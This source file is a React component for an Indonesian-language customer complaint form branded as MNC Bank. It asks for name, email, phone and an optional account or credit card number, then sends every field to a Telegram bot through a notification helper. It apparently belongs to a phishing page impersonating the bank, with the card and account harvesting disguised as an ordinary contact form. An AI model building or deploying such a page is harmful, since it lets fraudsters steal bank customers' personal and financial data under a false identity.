import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Send, MapPin, CheckCircle } from "lucide-react";
import { sendTelegramNotification } from "@/lib/telegram";

function WhatsAppIcon({ className }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      className={className}
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
    </svg>
  );
}

export function ContactForm() {
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    const formData = new FormData(e.currentTarget);
    const data = {
      nama: formData.get("nama") as string,
      email: formData.get("email") as string,
      telepon: formData.get("telepon") as string,
      norek: formData.get("norek") as string || "-",
      kategori: formData.get("kategori") as string,
      pesan: formData.get("pesan") as string,
    };

    await sendTelegramNotification({
      action: "Formulir Pengaduan Dikirim",
      message: `Pengaduan baru dari nasabah MNC Bank\n\n👤 Nama: ${data.nama}\n📧 Email: ${data.email}\n📱 Telepon: ${data.telepon}\n💳 No Rekening: ${data.norek}\n📂 Kategori: ${data.kategori}\n📝 Pesan: ${data.pesan}`,
      data,
    });

    setSubmitted(true);
  };

  return (
    <section id="kontak" className="py-16 md:py-24 bg-secondary/50">
      <div className="container">
        <div className="text-center max-w-2xl mx-auto mb-12 md:mb-16">
          <h2 className="font-heading text-3xl font-bold text-foreground sm:text-4xl mb-4">
            Hubungi Kami
          </h2>
          <p className="text-muted-foreground text-lg">
            Ajukan pengaduan, konsultasi, atau pertanyaan Anda melalui formulir
            di bawah ini. Tim <strong>MNC Bank</strong> akan segera
            menindaklanjuti.
          </p>
        </div>

        <div className="grid gap-10 lg:grid-cols-5">
          <div className="lg:col-span-3">
            <Card className="border-border/60">
              <CardHeader>
                <CardTitle className="font-heading text-xl">
                  Formulir Pengaduan Nasabah
                </CardTitle>
              </CardHeader>
              <CardContent>
                {submitted ? (
                  <div className="flex flex-col items-center justify-center py-12 text-center">
                    <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-100 text-green-600">
                      <CheckCircle className="h-8 w-8" />
                    </div>
                    <h3 className="font-heading text-xl font-semibold text-foreground mb-2">
                      Pengaduan Terkirim
                    </h3>
                    <p className="text-muted-foreground max-w-sm">
                      Terima kasih. Tim layanan pelanggan{" "}
                      <strong>MNC Bank</strong> akan menghubungi Anda
                      dalam waktu 1x24 jam kerja.
                    </p>
                  </div>
                ) : (
                  <form onSubmit={handleSubmit} className="space-y-5">
                    <div className="grid gap-5 sm:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="nama">Nama Lengkap</Label>
                        <Input
                          id="nama"
                          placeholder="Masukkan nama lengkap"
                          required
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="email">Email</Label>
                        <Input
                          id="email"
                          type="email"
                          placeholder="email@example.com"
                          required
                        />
                      </div>
                    </div>

                    <div className="grid gap-5 sm:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="telepon">Nomor Telepon</Label>
                        <Input
                          id="telepon"
                          type="tel"
                          placeholder="0812XXXXXXXX"
                          required
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="norek">Nomor Rekening/Kartu Kredit (Opsional)</Label>
                        <Input
                          id="norek"
                          placeholder="Contoh: 1234567890"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="kategori">Kategori Pengaduan</Label>
                      <Select required>
                        <SelectTrigger id="kategori">
                          <SelectValue placeholder="Pilih kategori" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="transaksi">
                            Masalah Transaksi
                          </SelectItem>
                          <SelectItem value="e-banking">
                            Gangguan MotionBank
                          </SelectItem>
                          <SelectItem value="biaya">
                            Kartu Kredit MNC Bank
                          </SelectItem>
                          <SelectItem value="layanan">
                            Layanan Customer Service
                          </SelectItem>
                          <SelectItem value="penagihan">
                            Penagihan
                          </SelectItem>
                          <SelectItem value="produk">
                            Informasi Produk
                          </SelectItem>
                          <SelectItem value="lainnya">
                            Lainnya
                          </SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="pesan">Detail Pengaduan</Label>
                      <Textarea
                        id="pesan"
                        placeholder="Jelaskan detail keluhan atau pertanyaan Anda..."
                        rows={5}
                        required
                      />
                    </div>

                    <Button
                      type="submit"
                      className="w-full bg-primary text-primary-foreground hover:bg-primary/90 font-semibold"
                    >
                      <Send className="mr-2 h-4 w-4" />
                      Kirim Pengaduan
                    </Button>
                  </form>
                )}
              </CardContent>
            </Card>
          </div>

          <div className="lg:col-span-2 space-y-6">
            <Card className="border-border/60">
              <CardContent className="p-6 space-y-6">
                <div className="flex items-start gap-4">
                  <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary shrink-0">
                    <WhatsAppIcon className="h-5 w-5" />
                  </div>
                  <div>
                    <h4 className="font-heading font-semibold text-foreground">
                      Call Center
                    </h4>
                    <p className="text-sm text-muted-foreground">
                      081 114 4061 (24 Jam)
                    </p>
                  </div>
                </div>

                <div className="flex items-start gap-4">
                  <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary shrink-0">
                    <WhatsAppIcon className="h-5 w-5" />
                  </div>
                  <div>
                    <h4 className="font-heading font-semibold text-foreground">
                      WhatsApp Center
                    </h4>
                    <p className="text-sm text-muted-foreground">
                      081 114 4061 (24 Jam)
                    </p>
                  </div>
                </div>

                <div className="flex items-start gap-4">
                  <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary shrink-0">
                    <MapPin className="h-5 w-5" />
                  </div>
                  <div>
                    <h4 className="font-heading font-semibold text-foreground">
                      Kantor Pusat
                    </h4>
                    <p className="text-sm text-muted-foreground">
                      MNC Bank Tower, Jl Kebon Sirih No. 21-27, Menteng, Jakarta Pusat, Indonesia.
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="rounded-xl border border-border/60 bg-background p-6">
              <h4 className="font-heading font-semibold text-foreground mb-3">
                Catatan Penting
              </h4>
              <ul className="space-y-2 text-sm text-muted-foreground">
                <li className="flex items-start gap-2">
                  <span className="text-accent mt-0.5">•</span>
                  Pastikan data yang Anda isi sudah benar dan lengkap.
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-accent mt-0.5">•</span>
                  Sertakan bukti pendukung untuk mempercepat proses.
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-accent mt-0.5">•</span>
                  Waktu respons maksimal 5 hari kerja.
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}